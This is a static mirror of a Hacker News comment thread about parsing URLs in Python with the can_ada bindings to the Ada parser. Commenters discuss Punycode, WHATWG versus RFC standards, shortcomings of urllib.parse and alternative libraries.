<!DOCTYPE html><html lang="en"><head><title>Static News</title><meta charSet="utf-8"/><meta name="description" content="Static delayed Hacker News."/><meta name="theme-color" media="(prefers-color-scheme: light)" content="white"/><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1d1f21"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/><meta name="application-name" content="Static News"/><meta name="apple-mobile-web-app-title" content="Static News"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-status-bar-style" content="#1d1f21"/><link rel="preload" href="styles.css?v=1710666065876" as="style"/><link rel="stylesheet" href="styles.css?v=1710666065876"/></head><body><div id="container"><div id="inner"><header><a href="/">Static News</a><a href="/about">about</a></header><div id="content"><div><div id="title"><a href="https://tkte.ch/articles/2024/03/15/parsing-urls-in-python.html">Parsing URLs in Python</a> <span class="domain">(<a href="https://tkte.ch">tkte.ch</a>)</span></div><div class="subtext"><span>ibobev</span> | <span>83 comments</span></div><br/><div><div id="39729950" class="c"><input type="checkbox" id="c-39729950" checked=""/><div class="controls bullet"><span class="by">kmike84</span><span>|</span><a href="#39729308">next</a><span>|</span><label class="collapse" for="c-39729950">[-]</label><label class="expand" for="c-39729950">[2 more]</label></div><br/><div class="children"><div class="content">A great initiative!<p>We need a better URL parser in Scrapy, for similar reasons. Speed and WHATWG standard compliance (i.e. do the same as web browsers) are the main things.<p>It&#x27;s possible to get closer to WHATWG behavior by using urllib and some hacks. This is what <a href="https:&#x2F;&#x2F;github.com&#x2F;scrapy&#x2F;w3lib">https:&#x2F;&#x2F;github.com&#x2F;scrapy&#x2F;w3lib</a> does, which Scrapy currently uses. But it&#x27;s still not quite compliant.<p>Also, surprisingly, on some crawls URL parsing can take CPU amounts similar to HTML parsing.<p>Ada &#x2F; can_ada look very promising!</div><br/><div id="39730013" class="c"><input type="checkbox" id="c-39730013" checked=""/><div class="controls bullet"><span class="by">TkTech</span><span>|</span><a href="#39729950">parent</a><span>|</span><a href="#39729308">next</a><span>|</span><label class="collapse" for="c-39730013">[-]</label><label class="expand" for="c-39730013">[1 more]</label></div><br/><div class="children"><div class="content">can_ada dev here. Scrapy is a fantastic project, we used it extensively at 360pi (now Numerator), making trillions of requests. Let me know if I can help :)</div><br/></div></div></div></div><div id="39729308" class="c"><input type="checkbox" id="c-39729308" checked=""/><div class="controls bullet"><span class="by">VagabundoP</span><span>|</span><a href="#39729950">prev</a><span>|</span><a href="#39730316">next</a><span>|</span><label class="collapse" for="c-39729308">[-]</label><label class="expand" for="c-39729308">[11 more]</label></div><br/><div class="children"><div class="content">Okay so some googling found me that the &quot;xn--&quot; means the rest of the hostname will be unicode, but why does é become -fsa in www.xn--googl-fsa.com.<p>Google failed on the second part.</div><br/><div id="39729321" class="c"><input type="checkbox" id="c-39729321" checked=""/><div class="controls bullet"><span class="by">js2</span><span>|</span><a href="#39729308">parent</a><span>|</span><a href="#39730054">next</a><span>|</span><label class="collapse" for="c-39729321">[-]</label><label class="expand" for="c-39729321">[3 more]</label></div><br/><div class="children"><div class="content">Because that&#x27;s the Punycode representation:<p><a href="https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Punycode" rel="nofollow">https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Punycode</a><p><a href="https:&#x2F;&#x2F;www.punycoder.com&#x2F;" rel="nofollow">https:&#x2F;&#x2F;www.punycoder.com&#x2F;</a></div><br/><div id="39730584" class="c"><input type="checkbox" id="c-39730584" checked=""/><div class="controls bullet"><span class="by">andy99</span><span>|</span><a href="#39729308">root</a><span>|</span><a href="#39729321">parent</a><span>|</span><a href="#39730054">next</a><span>|</span><label class="collapse" for="c-39730584">[-]</label><label class="expand" for="c-39730584">[2 more]</label></div><br/><div class="children"><div class="content">I wasn&#x27;t aware of this, I&#x27;d seen those URLs before but only in the context of Chinese ones and thought it was Chinese-specific.<p>It&#x27;s interesting because I just went down an apparent rabbit hole inplementing Byte-level encoding for using language models with unicode. There each byte in a unicode character is mapped to a printable character that goes up to 255 &lt; ord(x) &lt; 511 (I don&#x27;t remember the highest but the point is each byte is mapped to another printable unicode character.<p>See <a href="https:&#x2F;&#x2F;github.com&#x2F;openai&#x2F;gpt-2&#x2F;blob&#x2F;9b63575ef42771a015060c964af2c3da4cf7c8ab&#x2F;src&#x2F;encoder.py#L19">https:&#x2F;&#x2F;github.com&#x2F;openai&#x2F;gpt-2&#x2F;blob&#x2F;9b63575ef42771a015060c9...</a><p>And the actual list of characters:<p><a href="https:&#x2F;&#x2F;github.com&#x2F;rbitr&#x2F;llm.f90&#x2F;blob&#x2F;dev&#x2F;phi2&#x2F;phi2&#x2F;pretokenize.f90#L34">https:&#x2F;&#x2F;github.com&#x2F;rbitr&#x2F;llm.f90&#x2F;blob&#x2F;dev&#x2F;phi2&#x2F;phi2&#x2F;pretoken...</a></div><br/></div></div></div></div><div id="39730054" class="c"><input type="checkbox" id="c-39730054" checked=""/><div class="controls bullet"><span class="by">ekimekim</span><span>|</span><a href="#39729308">parent</a><span>|</span><a href="#39729321">prev</a><span>|</span><a href="#39731600">next</a><span>|</span><label class="collapse" for="c-39730054">[-]</label><label class="expand" for="c-39730054">[1 more]</label></div><br/><div class="children"><div class="content">To expand on the sibling comments: This encoding (called Punycode) works by combining the character to encode (é) and the position the character should be in (the 7th position out of a possible 7) into a single number. é is 233, there are 7 possible positions, and it is in position 6 (0-indexed) so that single number is 233 * 7 + 6 = 1637. This is then encoded via a fairly complex variable-length encoding scheme into the letters &quot;fsa&quot;.<p>See <a href="https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Punycode#Encoding_the_non-ASCII_characters" rel="nofollow">https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Punycode#Encoding_the_non-ASCI...</a></div><br/></div></div><div id="39731600" class="c"><input type="checkbox" id="c-39731600" checked=""/><div class="controls bullet"><span class="by">ks2048</span><span>|</span><a href="#39729308">parent</a><span>|</span><a href="#39730054">prev</a><span>|</span><a href="#39729320">next</a><span>|</span><label class="collapse" for="c-39731600">[-]</label><label class="expand" for="c-39731600">[2 more]</label></div><br/><div class="children"><div class="content">This system seems pretty weird to me.<p>I was wondering, can that clash with a &quot;normal&quot; domain registered as &quot;xn--.....&quot;? Apparently there is another specific rule in RFC 5891 saying &quot;The Unicode string MUST NOT contain &quot;--&quot; (two consecutive hyphens) in the third and fourth character positions&quot; [0]<p>Also, if I was forced to represent Unicode as ASCII, punycode encoding is not the obvious one - it&#x27;s pretty confusing. But, I don&#x27;t know much about how and why it was chosen, so I assume there&#x27;s good reason.<p>[0] <a href="https:&#x2F;&#x2F;datatracker.ietf.org&#x2F;doc&#x2F;html&#x2F;rfc5891#section-4.2.3.1" rel="nofollow">https:&#x2F;&#x2F;datatracker.ietf.org&#x2F;doc&#x2F;html&#x2F;rfc5891#section-4.2.3....</a></div><br/><div id="39732053" class="c"><input type="checkbox" id="c-39732053" checked=""/><div class="controls bullet"><span class="by">lathiat</span><span>|</span><a href="#39729308">root</a><span>|</span><a href="#39731600">parent</a><span>|</span><a href="#39729320">next</a><span>|</span><label class="collapse" for="c-39732053">[-]</label><label class="expand" for="c-39732053">[1 more]</label></div><br/><div class="children"><div class="content">I mean, yeah, but the odds of someone using &quot;xn--&quot; on the start of a domain are pretty small. The double dash is pretty uncommon.</div><br/></div></div></div></div><div id="39729320" class="c"><input type="checkbox" id="c-39729320" checked=""/><div class="controls bullet"><span class="by">whalesalad</span><span>|</span><a href="#39729308">parent</a><span>|</span><a href="#39731600">prev</a><span>|</span><a href="#39731865">next</a><span>|</span><label class="collapse" for="c-39729320">[-]</label><label class="expand" for="c-39729320">[1 more]</label></div><br/><div class="children"><div class="content">It’s called an IDN. This is an encoding format called puny code that transforms international domains into ascii</div><br/></div></div><div id="39731865" class="c"><input type="checkbox" id="c-39731865" checked=""/><div class="controls bullet"><span class="by">Zambyte</span><span>|</span><a href="#39729308">parent</a><span>|</span><a href="#39729320">prev</a><span>|</span><a href="#39730656">next</a><span>|</span><label class="collapse" for="c-39731865">[-]</label><label class="expand" for="c-39731865">[1 more]</label></div><br/><div class="children"><div class="content">Regarding the quality of Google search results - I copied this comment verbatim into GPT 3.5, Claude 1, and Mistral small (the lowest quality LLMs from each provider available through Kagi) and each one explained Punycode encoding.</div><br/></div></div><div id="39730656" class="c"><input type="checkbox" id="c-39730656" checked=""/><div class="controls bullet"><span class="by">pixelesque</span><span>|</span><a href="#39729308">parent</a><span>|</span><a href="#39731865">prev</a><span>|</span><a href="#39730316">next</a><span>|</span><label class="collapse" for="c-39730656">[-]</label><label class="expand" for="c-39730656">[2 more]</label></div><br/><div class="children"><div class="content">In case anyone else is confused as to why the domain in the example provided needs to be unicode (compared to the filename which is obvious): it&#x27;s because the hyphen is the shorter &#x27;‑&#x27; char, which is extended ASCII 226 not the standard &#x27;-&#x27; (which would be ASCII 45).</div><br/><div id="39732389" class="c"><input type="checkbox" id="c-39732389" checked=""/><div class="controls bullet"><span class="by">ezequiel-garzon</span><span>|</span><a href="#39729308">root</a><span>|</span><a href="#39730656">parent</a><span>|</span><a href="#39730316">next</a><span>|</span><label class="collapse" for="c-39732389">[-]</label><label class="expand" for="c-39732389">[1 more]</label></div><br/><div class="children"><div class="content">The first character you pasted is U+2011 (8209 in decimal), does not appear in the document and cannot be ASCII as it goes beyond the codepoint 127&#x2F;7F. Also, U+2011 is meant to be a non-breaking hyphen.</div><br/></div></div></div></div></div></div><div id="39730316" class="c"><input type="checkbox" id="c-39730316" checked=""/><div class="controls bullet"><span class="by">JulianWasTaken</span><span>|</span><a href="#39729308">prev</a><span>|</span><a href="#39730555">next</a><span>|</span><label class="collapse" for="c-39730316">[-]</label><label class="expand" for="c-39730316">[1 more]</label></div><br/><div class="children"><div class="content">Nice.<p>I&#x27;ll also throw in that I&#x27;ve recently wrote bindings to Mozilla&#x27;s servo URL library.<p>Those live at <a href="https:&#x2F;&#x2F;github.com&#x2F;crate-py&#x2F;url">https:&#x2F;&#x2F;github.com&#x2F;crate-py&#x2F;url</a><p>They&#x27;re not complete yet (meaning only the parsing bits are exposed, not URL modification) but I too was frustrated with the state of URL parsing.</div><br/></div></div><div id="39730555" class="c"><input type="checkbox" id="c-39730555" checked=""/><div class="controls bullet"><span class="by">phyzome</span><span>|</span><a href="#39730316">prev</a><span>|</span><a href="#39728381">next</a><span>|</span><label class="collapse" for="c-39730555">[-]</label><label class="expand" for="c-39730555">[3 more]</label></div><br/><div class="children"><div class="content">Honestly to hell with the WHATWG&#x27;s weird pseudo-standard. Backslashes? Five forward slashes? <i>No one</i> is sending those URLs around, and if they are, they should fix it. The only thing that needs to deal with that kind of malformed URL is the browser&#x27;s address bar. If browsers want to do fixups on broken URLs at that point, they should feel free to, but it shouldn&#x27;t pollute an entire spec.<p>(It&#x27;s not even a real standard -- it&#x27;s a &quot;living standard&quot;, which means it just changes randomly and there&#x27;s no way to actually say &quot;yes, you&#x27;re compliant with that&quot;.)</div><br/><div id="39730609" class="c"><input type="checkbox" id="c-39730609" checked=""/><div class="controls bullet"><span class="by">domenicd</span><span>|</span><a href="#39730555">parent</a><span>|</span><a href="#39730570">next</a><span>|</span><label class="collapse" for="c-39730609">[-]</label><label class="expand" for="c-39730609">[1 more]</label></div><br/><div class="children"><div class="content">It&#x27;s always been extremely funny to me how arguments like this and from the curl author go. &quot;Yes, I had to change curl away from strictly accepting two slashes, for web compatibility. But `while(slash) { advance_parser() }`? That&#x27;s completely unreasonable! `while(slash &amp;&amp; ++i &lt;= 3)` is so much better, and works almost as well!&quot; Ok, whatever...<p>As for your claim about living standards, I&#x27;d encourage you to read <a href="https:&#x2F;&#x2F;whatwg.org&#x2F;faq#living-standard" rel="nofollow">https:&#x2F;&#x2F;whatwg.org&#x2F;faq#living-standard</a></div><br/></div></div></div></div><div id="39728381" class="c"><input type="checkbox" id="c-39728381" checked=""/><div class="controls bullet"><span class="by">memco</span><span>|</span><a href="#39730555">prev</a><span>|</span><a href="#39728558">next</a><span>|</span><label class="collapse" for="c-39728381">[-]</label><label class="expand" for="c-39728381">[4 more]</label></div><br/><div class="children"><div class="content">This is intriguing to me for the performance and correctness reasons, but also if it makes the result more dev friendly than the urllib.parse tiple-ish-object result thing.</div><br/><div id="39732933" class="c"><input type="checkbox" id="c-39732933" checked=""/><div class="controls bullet"><span class="by">diarrhea</span><span>|</span><a href="#39728381">parent</a><span>|</span><a href="#39731207">next</a><span>|</span><label class="collapse" for="c-39732933">[-]</label><label class="expand" for="c-39732933">[1 more]</label></div><br/><div class="children"><div class="content">Yeah, that tuple API is bizarre. It really doesn’t play well with type annotations either.</div><br/></div></div><div id="39731207" class="c"><input type="checkbox" id="c-39731207" checked=""/><div class="controls bullet"><span class="by">nerdponx</span><span>|</span><a href="#39728381">parent</a><span>|</span><a href="#39732933">prev</a><span>|</span><a href="#39728558">next</a><span>|</span><label class="collapse" for="c-39731207">[-]</label><label class="expand" for="c-39731207">[2 more]</label></div><br/><div class="children"><div class="content">I posted this elsewhere in the thread, but there absolutely is prior art here. Check out Yarl (urllib.parse wrapper with the nicer interface) and Hyperlink (green field, immutable OO style, focus on correctness). Both on PyPI for many years now.</div><br/><div id="39731810" class="c"><input type="checkbox" id="c-39731810" checked=""/><div class="controls bullet"><span class="by">memco</span><span>|</span><a href="#39728381">root</a><span>|</span><a href="#39731207">parent</a><span>|</span><a href="#39728558">next</a><span>|</span><label class="collapse" for="c-39731810">[-]</label><label class="expand" for="c-39731810">[1 more]</label></div><br/><div class="children"><div class="content">Thanks! I have come across yarl, but not hyperlink.</div><br/></div></div></div></div></div></div><div id="39728558" class="c"><input type="checkbox" id="c-39728558" checked=""/><div class="controls bullet"><span class="by">pyuser583</span><span>|</span><a href="#39728381">prev</a><span>|</span><a href="#39728448">next</a><span>|</span><label class="collapse" for="c-39728558">[-]</label><label class="expand" for="c-39728558">[13 more]</label></div><br/><div class="children"><div class="content">The Ada programming language is cursed with overlapping acronyms. GPS, ADA, SPARK, AWS. Seems it just got a little bit worse.</div><br/><div id="39728620" class="c"><input type="checkbox" id="c-39728620" checked=""/><div class="controls bullet"><span class="by">masklinn</span><span>|</span><a href="#39728558">parent</a><span>|</span><a href="#39728907">next</a><span>|</span><label class="collapse" for="c-39728620">[-]</label><label class="expand" for="c-39728620">[5 more]</label></div><br/><div class="children"><div class="content">&gt; Ada is a WHATWG-compliant and fast URL parser written in modern C++<p>Why would you do that, Daniel?</div><br/><div id="39731288" class="c"><input type="checkbox" id="c-39731288" checked=""/><div class="controls bullet"><span class="by">yagiznizipli</span><span>|</span><a href="#39728558">root</a><span>|</span><a href="#39728620">parent</a><span>|</span><a href="#39729813">next</a><span>|</span><label class="collapse" for="c-39731288">[-]</label><label class="expand" for="c-39731288">[2 more]</label></div><br/><div class="children"><div class="content">Ada developer here, Ada is the name of my daughter, and this project is my gift to her, to remember me.</div><br/><div id="39732156" class="c"><input type="checkbox" id="c-39732156" checked=""/><div class="controls bullet"><span class="by">pyuser583</span><span>|</span><a href="#39728558">root</a><span>|</span><a href="#39731288">parent</a><span>|</span><a href="#39729813">next</a><span>|</span><label class="collapse" for="c-39732156">[-]</label><label class="expand" for="c-39732156">[1 more]</label></div><br/><div class="children"><div class="content">Congrats on having a daughter! I hope and day she’ll need to parse a url, and be able to see your love for her in her code!</div><br/></div></div></div></div><div id="39729813" class="c"><input type="checkbox" id="c-39729813" checked=""/><div class="controls bullet"><span class="by">TkTech</span><span>|</span><a href="#39728558">root</a><span>|</span><a href="#39728620">parent</a><span>|</span><a href="#39731288">prev</a><span>|</span><a href="#39728907">next</a><span>|</span><label class="collapse" for="c-39729813">[-]</label><label class="expand" for="c-39729813">[2 more]</label></div><br/><div class="children"><div class="content">Hah :) It&#x27;s named after Yagiz Nizipli&#x27;s (Ada dev) newborn daughter, Ada.</div><br/></div></div></div></div><div id="39728907" class="c"><input type="checkbox" id="c-39728907" checked=""/><div class="controls bullet"><span class="by">EmilStenstrom</span><span>|</span><a href="#39728558">parent</a><span>|</span><a href="#39728620">prev</a><span>|</span><a href="#39728605">next</a><span>|</span><label class="collapse" for="c-39728907">[-]</label><label class="expand" for="c-39728907">[1 more]</label></div><br/><div class="children"><div class="content">At least the can_ada (canada!) makes it a little bit more unique.</div><br/></div></div><div id="39728605" class="c"><input type="checkbox" id="c-39728605" checked=""/><div class="controls bullet"><span class="by">Solvency</span><span>|</span><a href="#39728558">parent</a><span>|</span><a href="#39728907">prev</a><span>|</span><a href="#39728825">next</a><span>|</span><label class="collapse" for="c-39728605">[-]</label><label class="expand" for="c-39728605">[5 more]</label></div><br/><div class="children"><div class="content">It is <i>mindboggling</i> to me how often developers create project names without even <i>trying</i> to search for precedent names <i>in their own domain&#x2F;industry</i>.<p>Calling this Ada is just ridiculous.</div><br/><div id="39728664" class="c"><input type="checkbox" id="c-39728664" checked=""/><div class="controls bullet"><span class="by">pyuser583</span><span>|</span><a href="#39728558">root</a><span>|</span><a href="#39728605">parent</a><span>|</span><a href="#39731296">next</a><span>|</span><label class="collapse" for="c-39728664">[-]</label><label class="expand" for="c-39728664">[1 more]</label></div><br/><div class="children"><div class="content">Ada needs to fight back. Java templating library! Python dependency resolver! Zag image manipulation library! SQL event logging persistence framework!<p>I can’t believe Amazon wasn’t violating some anti-competition rule by using “AWS” for “Amazon Web Services” when it already meant “Ada Web Server.”<p>Wow when I search for “Ada GPS” I get global position system support libraries before GNAT Programming Studio.</div><br/></div></div><div id="39731296" class="c"><input type="checkbox" id="c-39731296" checked=""/><div class="controls bullet"><span class="by">yagiznizipli</span><span>|</span><a href="#39728558">root</a><span>|</span><a href="#39728605">parent</a><span>|</span><a href="#39728664">prev</a><span>|</span><a href="#39730138">next</a><span>|</span><label class="collapse" for="c-39731296">[-]</label><label class="expand" for="c-39731296">[1 more]</label></div><br/><div class="children"><div class="content">Ada developer here. Ada URL parser is named after my daughter Ada. We chose this name in particular as a reference to Ada Lovelace.</div><br/></div></div><div id="39730138" class="c"><input type="checkbox" id="c-39730138" checked=""/><div class="controls bullet"><span class="by">gjvc</span><span>|</span><a href="#39728558">root</a><span>|</span><a href="#39728605">parent</a><span>|</span><a href="#39731296">prev</a><span>|</span><a href="#39728825">next</a><span>|</span><label class="collapse" for="c-39730138">[-]</label><label class="expand" for="c-39730138">[2 more]</label></div><br/><div class="children"><div class="content">yes but they think it&#x27;s punny&#x2F;funny&#x2F;clever</div><br/><div id="39730907" class="c"><input type="checkbox" id="c-39730907" checked=""/><div class="controls bullet"><span class="by">nine_k</span><span>|</span><a href="#39728558">root</a><span>|</span><a href="#39730138">parent</a><span>|</span><a href="#39728825">next</a><span>|</span><label class="collapse" for="c-39730907">[-]</label><label class="expand" for="c-39730907">[1 more]</label></div><br/><div class="children"><div class="content">It&#x27;s usually a poor reason.
Calling the GNU Image Manipulation Program &quot;GIMP&quot; was kinda funny and punny, and maybe humble, but not wise.<p>Inkscape or Krita have less poignant, but more reasonable name. (But yes, such an approach removes some of the teenage fun from doing a project.)</div><br/></div></div></div></div></div></div></div></div><div id="39728448" class="c"><input type="checkbox" id="c-39728448" checked=""/><div class="controls bullet"><span class="by">Areading314</span><span>|</span><a href="#39728558">prev</a><span>|</span><a href="#39729570">next</a><span>|</span><label class="collapse" for="c-39728448">[-]</label><label class="expand" for="c-39728448">[23 more]</label></div><br/><div class="children"><div class="content">Hard to imagine the tradeoff of using a third party binary library developed this year vs just using urllib.parse being worth it. Is this solving a real problem?</div><br/><div id="39728711" class="c"><input type="checkbox" id="c-39728711" checked=""/><div class="controls bullet"><span class="by">masklinn</span><span>|</span><a href="#39728448">parent</a><span>|</span><a href="#39731303">next</a><span>|</span><label class="collapse" for="c-39728711">[-]</label><label class="expand" for="c-39728711">[10 more]</label></div><br/><div class="children"><div class="content">According to itself, it&#x27;s solving the issue of parsing differentials vulnerabilities: urllib.parse is ad-hoc and pretty crummy, and the headliner function &quot;urlparse&quot; is literally the one you should not use under any circumstance: it follows RFC 1808 (maybe, anyway) which was deprecated by RFC 2396 <i>25 years ago</i>.<p>The odds that any other parser uses the same broken semantics are basically nil.</div><br/><div id="39729575" class="c"><input type="checkbox" id="c-39729575" checked=""/><div class="controls bullet"><span class="by">woodruffw</span><span>|</span><a href="#39728448">root</a><span>|</span><a href="#39728711">parent</a><span>|</span><a href="#39729015">next</a><span>|</span><label class="collapse" for="c-39729575">[-]</label><label class="expand" for="c-39729575">[2 more]</label></div><br/><div class="children"><div class="content">I agree that the stdlib parser is a mess, but as an observation: replacing one use of it with a (better!) implementation <i>introduces</i> a potential parser differential where one didn’t exist before. I’ve seen this issue crop up multiple times in real Python codebases, where a well-intentioned developer adds a differential by incrementally replacing the old, bad implementation.<p>That’s the perverse nature of “wrong but ubiquitous” parsers: unless you’re confident that your replacement is <i>complete</i>, you can make the situation worse, not better.</div><br/><div id="39730028" class="c"><input type="checkbox" id="c-39730028" checked=""/><div class="controls bullet"><span class="by">Spivak</span><span>|</span><a href="#39728448">root</a><span>|</span><a href="#39729575">parent</a><span>|</span><a href="#39729015">next</a><span>|</span><label class="collapse" for="c-39730028">[-]</label><label class="expand" for="c-39730028">[1 more]</label></div><br/><div class="children"><div class="content">&gt; unless you’re confident that your replacement is complete<p>And that any 3rd party libs you use also don&#x27;t ever call the stdlib parser internally because you do not want to debug why a URL works through some code paths but not others.<p>Turns out that url parsing is a cross-cutting concern like logging where libs should defer to the calling code&#x27;s implementation but the Python devs couldn&#x27;t have known that when this module was written.</div><br/></div></div></div></div><div id="39729015" class="c"><input type="checkbox" id="c-39729015" checked=""/><div class="controls bullet"><span class="by">Areading314</span><span>|</span><a href="#39728448">root</a><span>|</span><a href="#39728711">parent</a><span>|</span><a href="#39729575">prev</a><span>|</span><a href="#39731303">next</a><span>|</span><label class="collapse" for="c-39729015">[-]</label><label class="expand" for="c-39729015">[7 more]</label></div><br/><div class="children"><div class="content">It seems unlikely that this C++ library written by a solo dev is somehow more secure than the Python standard library would be for such a security-sensitive task.</div><br/><div id="39729201" class="c"><input type="checkbox" id="c-39729201" checked=""/><div class="controls bullet"><span class="by">masklinn</span><span>|</span><a href="#39728448">root</a><span>|</span><a href="#39729015">parent</a><span>|</span><a href="#39729825">next</a><span>|</span><label class="collapse" for="c-39729201">[-]</label><label class="expand" for="c-39729201">[4 more]</label></div><br/><div class="children"><div class="content">Not in the sense of differential vulnerabilities, since the standard library <i>refuses</i> to match any sort of modern standard.<p>It&#x27;s also<p>1. not a solo dev<p>2. Daniel Lemire<p>3. a serious engineering <i>and</i> research effort: <a href="https:&#x2F;&#x2F;arxiv.org&#x2F;pdf&#x2F;2311.10533.pdf" rel="nofollow">https:&#x2F;&#x2F;arxiv.org&#x2F;pdf&#x2F;2311.10533.pdf</a></div><br/><div id="39729301" class="c"><input type="checkbox" id="c-39729301" checked=""/><div class="controls bullet"><span class="by">Areading314</span><span>|</span><a href="#39728448">root</a><span>|</span><a href="#39729201">parent</a><span>|</span><a href="#39729825">next</a><span>|</span><label class="collapse" for="c-39729301">[-]</label><label class="expand" for="c-39729301">[3 more]</label></div><br/><div class="children"><div class="content">This is the commit history: <a href="https:&#x2F;&#x2F;github.com&#x2F;TkTech&#x2F;can_ada&#x2F;commits&#x2F;main&#x2F;">https:&#x2F;&#x2F;github.com&#x2F;TkTech&#x2F;can_ada&#x2F;commits&#x2F;main&#x2F;</a><p>I guess you are right that there are 2 commits from a different dev, so it is technically not a solo project. I still wouldn&#x27;t ever use this in production code.</div><br/><div id="39729453" class="c"><input type="checkbox" id="c-39729453" checked=""/><div class="controls bullet"><span class="by">masklinn</span><span>|</span><a href="#39728448">root</a><span>|</span><a href="#39729301">parent</a><span>|</span><a href="#39729440">next</a><span>|</span><label class="collapse" for="c-39729453">[-]</label><label class="expand" for="c-39729453">[1 more]</label></div><br/><div class="children"><div class="content">...<p>can_ada is just the python bindings.<p>The actual underlying project is at <a href="https:&#x2F;&#x2F;github.com&#x2F;ada-url&#x2F;ada">https:&#x2F;&#x2F;github.com&#x2F;ada-url&#x2F;ada</a></div><br/></div></div><div id="39729440" class="c"><input type="checkbox" id="c-39729440" checked=""/><div class="controls bullet"><span class="by">bqmjjx0kac</span><span>|</span><a href="#39728448">root</a><span>|</span><a href="#39729301">parent</a><span>|</span><a href="#39729453">prev</a><span>|</span><a href="#39729825">next</a><span>|</span><label class="collapse" for="c-39729440">[-]</label><label class="expand" for="c-39729440">[1 more]</label></div><br/><div class="children"><div class="content">The can_ada repo threw me off, too. It looks super amateurish because of the lack of tests, fuzzers, etc.<p>But it appears that they&#x27;ve just exported the meat of the Ada project and left everything else upstream.</div><br/></div></div></div></div></div></div><div id="39729825" class="c"><input type="checkbox" id="c-39729825" checked=""/><div class="controls bullet"><span class="by">TkTech</span><span>|</span><a href="#39728448">root</a><span>|</span><a href="#39729015">parent</a><span>|</span><a href="#39729201">prev</a><span>|</span><a href="#39731303">next</a><span>|</span><label class="collapse" for="c-39729825">[-]</label><label class="expand" for="c-39729825">[2 more]</label></div><br/><div class="children"><div class="content">Hi, can_ada (but not ada!) dev here. Ada is over 20k lines of well-tested and fuzzed source  by 25+ developers, along with an accompanying research paper. It is the parser used in node.js and parses billions of URLs a day.<p>can_ada is simply a 60-line glue and packaging making it available with low overhead to Python.</div><br/><div id="39731722" class="c"><input type="checkbox" id="c-39731722" checked=""/><div class="controls bullet"><span class="by">Areading314</span><span>|</span><a href="#39728448">root</a><span>|</span><a href="#39729825">parent</a><span>|</span><a href="#39731303">next</a><span>|</span><label class="collapse" for="c-39731722">[-]</label><label class="expand" for="c-39731722">[1 more]</label></div><br/><div class="children"><div class="content">Ah, that makes more sense -- it might be a good idea to integrate with the upstream library as a submodule rather than lifting the actual .cpp&#x2F;.h files into the bindings repo. That way people know the upstream C++ code is from a much more active project.<p>Despite my snarky comments, thank you for contributing to the python ecosystem, this does seem like a cool project for high performance URL parsing!</div><br/></div></div></div></div></div></div></div></div><div id="39731303" class="c"><input type="checkbox" id="c-39731303" checked=""/><div class="controls bullet"><span class="by">yagiznizipli</span><span>|</span><a href="#39728448">parent</a><span>|</span><a href="#39728711">prev</a><span>|</span><a href="#39728540">next</a><span>|</span><label class="collapse" for="c-39731303">[-]</label><label class="expand" for="c-39731303">[1 more]</label></div><br/><div class="children"><div class="content">Ada was developed in eoy 2022, and included in Node.js since March 2023. Since then, Ada powers Node.js, Cloudflare workers, Redpanda, Clickhouse and many more libraries.</div><br/></div></div><div id="39728540" class="c"><input type="checkbox" id="c-39728540" checked=""/><div class="controls bullet"><span class="by">pyuser583</span><span>|</span><a href="#39728448">parent</a><span>|</span><a href="#39731303">prev</a><span>|</span><a href="#39728830">next</a><span>|</span><label class="collapse" for="c-39728540">[-]</label><label class="expand" for="c-39728540">[10 more]</label></div><br/><div class="children"><div class="content">urlib.parse is a pain. We really need something more like pathlib.Path.</div><br/><div id="39728939" class="c"><input type="checkbox" id="c-39728939" checked=""/><div class="controls bullet"><span class="by">Ch00k</span><span>|</span><a href="#39728448">root</a><span>|</span><a href="#39728540">parent</a><span>|</span><a href="#39728635">next</a><span>|</span><label class="collapse" for="c-39728939">[-]</label><label class="expand" for="c-39728939">[5 more]</label></div><br/><div class="children"><div class="content">There is <a href="https:&#x2F;&#x2F;github.com&#x2F;gruns&#x2F;furl">https:&#x2F;&#x2F;github.com&#x2F;gruns&#x2F;furl</a></div><br/><div id="39729106" class="c"><input type="checkbox" id="c-39729106" checked=""/><div class="controls bullet"><span class="by">AMCMneCy</span><span>|</span><a href="#39728448">root</a><span>|</span><a href="#39728939">parent</a><span>|</span><a href="#39729324">next</a><span>|</span><label class="collapse" for="c-39729106">[-]</label><label class="expand" for="c-39729106">[2 more]</label></div><br/><div class="children"><div class="content">Also <a href="https:&#x2F;&#x2F;github.com&#x2F;aio-libs&#x2F;yarl">https:&#x2F;&#x2F;github.com&#x2F;aio-libs&#x2F;yarl</a></div><br/><div id="39731060" class="c"><input type="checkbox" id="c-39731060" checked=""/><div class="controls bullet"><span class="by">4ec0755f5522</span><span>|</span><a href="#39728448">root</a><span>|</span><a href="#39729106">parent</a><span>|</span><a href="#39729324">next</a><span>|</span><label class="collapse" for="c-39731060">[-]</label><label class="expand" for="c-39731060">[1 more]</label></div><br/><div class="children"><div class="content">I use yarl as my default for this as well, it&#x27;s been great to work with.</div><br/></div></div></div></div><div id="39729324" class="c"><input type="checkbox" id="c-39729324" checked=""/><div class="controls bullet"><span class="by">VagabundoP</span><span>|</span><a href="#39728448">root</a><span>|</span><a href="#39728939">parent</a><span>|</span><a href="#39729106">prev</a><span>|</span><a href="#39729317">next</a><span>|</span><label class="collapse" for="c-39729324">[-]</label><label class="expand" for="c-39729324">[1 more]</label></div><br/><div class="children"><div class="content">This library is very pythonic.</div><br/></div></div><div id="39729317" class="c"><input type="checkbox" id="c-39729317" checked=""/><div class="controls bullet"><span class="by">pyuser583</span><span>|</span><a href="#39728448">root</a><span>|</span><a href="#39728939">parent</a><span>|</span><a href="#39729324">prev</a><span>|</span><a href="#39728635">next</a><span>|</span><label class="collapse" for="c-39729317">[-]</label><label class="expand" for="c-39729317">[1 more]</label></div><br/><div class="children"><div class="content">Yes! That’s the one I like!</div><br/></div></div></div></div><div id="39728635" class="c"><input type="checkbox" id="c-39728635" checked=""/><div class="controls bullet"><span class="by">masklinn</span><span>|</span><a href="#39728448">root</a><span>|</span><a href="#39728540">parent</a><span>|</span><a href="#39728939">prev</a><span>|</span><a href="#39729329">next</a><span>|</span><label class="collapse" for="c-39728635">[-]</label><label class="expand" for="c-39728635">[3 more]</label></div><br/><div class="children"><div class="content">That used to be werkzeug.urls, kinda (it certainly had a more convenient API than urllib.parse), 